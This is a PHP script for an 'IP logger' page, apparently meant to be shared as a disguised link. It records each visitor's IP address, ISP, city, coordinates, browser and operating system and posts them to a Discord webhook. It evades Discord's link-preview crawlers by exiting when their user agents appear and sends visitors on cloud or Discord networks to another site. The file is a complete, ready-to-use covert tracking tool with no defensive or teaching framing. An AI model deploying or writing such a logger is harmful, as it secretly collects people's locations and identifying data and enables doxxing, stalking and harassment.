<?php

// PUT A WEBHOOK HERE
$webhookurl = "https://discord.com/api/webhooks/...";


function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
							'/kalilinux/i'          =>  'KaliLinux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile',
							'/Windows Phone/i'      =>  'Windows Phone'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

function getBrowser() {

    $browser        =   "Unknown Browser";

    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
							'/Mozilla/i'	=>	'Mozila',
							'/Mozilla 5.0/i'=>	'Mozila',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/edge/i'       =>  'Edge',
                            '/opera/i'      =>  'Opera',
							'/OPR/i'        =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
							'/Bot/i'		=>	'BOT Browser',
							'/Valve Steam GameOverlay/i'  =>  'Steam',
                            '/mobile/i'     =>  'Handheld Browser'
                        );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT'])) {
            $browser    =   $value;
        }

    }

    return $browser;

}

//=======================================================================================================
// Create new webhook in your Discord channel settings and copy&paste URL
//=======================================================================================================

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$arr = array('DiscordBot', 'Discordbot', '+https://discordapp.com', 'electron', 'discord', 'Firefox/92.0');
foreach ($arr as &$value) {
    if (strpos($_SERVER['HTTP_USER_AGENT'], $value) !== false){
        exit();
    }
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ipaddress = $_SERVER['REMOTE_ADDR'];
}

//=======================================================================================================
// Compose message. You can use Markdown
// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting
//========================================================================================================

$timestamp = date("c", strtotime("now"));

$Curl = curl_init("http://ip-api.com/json/$ipaddress?fields=status,country,countryCode,region,lat,lon,regionName,city,zip,timezone,isp,org,as,proxy"); //Get the info of the IP using Curl
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($Curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($Curl, CURLOPT_SSL_VERIFYHOST, false);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$ProxyCheck = $Info->proxy ? '✅' : '❌';;
$Country = $Info->country;
$Region = $Info->regionName;
$City = $Info->city;
$COORD = "$Info->lat, $Info->lon"; // Coordinates
$browser = getBrowser(); // Get the browser of the user
$OS = getOS(); // Get the OS of the user


$arr = array('Amazon',"Discord");
foreach ($arr as &$value) {
    if (strpos($ISP, $value) !== false){
        header('Location: https://nordvpn.net', true, 301);
        exit();
    }
}

#echo(getOS());

$json_data = json_encode([
    // Username
    "username" => "Logger",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    "avatar_url" => "https://www.ntooitive.com/wp-content/uploads/2017/11/if__IP_Address_1134556.png",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "<a:modCheck:996910975225708794> IP logger <a:modCheck:996910975225708794>",

            // description
            "description" => "more info <:soontmPINK1:705500236046663812><:soontmPINK2:705500235970904136>",
        
            // Embed Type
            "type" => "rich",
        
            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,
        
            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),
        
            // Additional Fields array
            "fields" => [
                // Field 1
                [
                    "name" => "<:lipbite:953966769717006386> IP Info",
                    "value" => "**__IP__**: $ipaddress\n**__ISP__**: $ISP\n**__Proxy__**: $ProxyCheck",
                    "inline" => true
                ],
                [
                    "name" => "<a:roblox_dance:814963734144876595> Location",
                    "value" => "**__Country__**: $Country\n**__Region__**: $Region\n**__City__**: $City\n**__Coordinates__**: $COORD",
                    "inline" => true
                ],
                [
                    "name" => "💻 Browser Info",
                    "value" => "**__Browser__**: $browser\n**__OS__**: $OS\n**__User Agent__**: $userAgent\n",
                    "inline" => false
                ],
                [
                    "name" => "🔗 Link",
                    "value" => "**__Link__**: `$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]`",
                    "inline" => false
                ]
            ]
        ]
    ]
                
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );
